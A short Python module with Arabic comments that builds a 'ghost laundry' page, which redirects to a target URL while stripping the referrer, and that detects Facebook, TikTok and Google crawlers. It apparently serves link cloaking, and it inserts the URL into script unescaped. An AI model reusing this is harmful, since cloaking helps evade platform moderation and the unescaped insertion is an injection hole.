from user_agents import parse

# --- 1. الغسالة الشبح (V9) ---
def get_laundry_html(target_url):
    return f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="referrer" content="no-referrer">
        <title>Loading...</title>
        <style>body{{background:#fff;}}</style>
    </head>
    <body>
        <script>
            window.location.replace("{target_url}");
        </script>
    </body>
    </html>
    '''

# --- 2. دالة كشف البوتات (هذه التي كانت ناقصة وسببت الخطأ) ---
def is_bot(user_agent_string):
    """
    فحص بسيط وسريع: هل هذا بوت أم بشر؟
    """
    if not user_agent_string: return True
    ua = parse(user_agent_string)
    return ua.is_bot

# --- 3. نظام الذكاء والتحليل (لصفحة الإحصائيات) ---
def analyze_visitor(user_agent_string):
    """
    تقرير كامل عن الزائر
    """
    if not user_agent_string:
        return {
            "is_bot": True, "bot_name": "Unknown",
            "browser": "Unknown", "os": "Unknown", "device": "Unknown"
        }

    ua = parse(user_agent_string)
    
    # كشف اسم البوت
    bot_name = None
    if ua.is_bot:
        ua_str = user_agent_string.lower()
        if 'facebook' in ua_str: bot_name = 'Facebook Bot'
        elif 'tiktok' in ua_str: bot_name = 'TikTok Bot'
        elif 'google' in ua_str: bot_name = 'Google Bot'
        else: bot_name = 'Generic Bot'
    
    # كشف الجهاز
    device_type = "Desktop"
    if ua.is_mobile: device_type = "Mobile"
    elif ua.is_tablet: device_type = "Tablet"
    
    return {
        "is_bot": ua.is_bot,
        "bot_name": bot_name,
        "browser": ua.browser.family,
        "os": ua.os.family,
        "device": device_type
    }
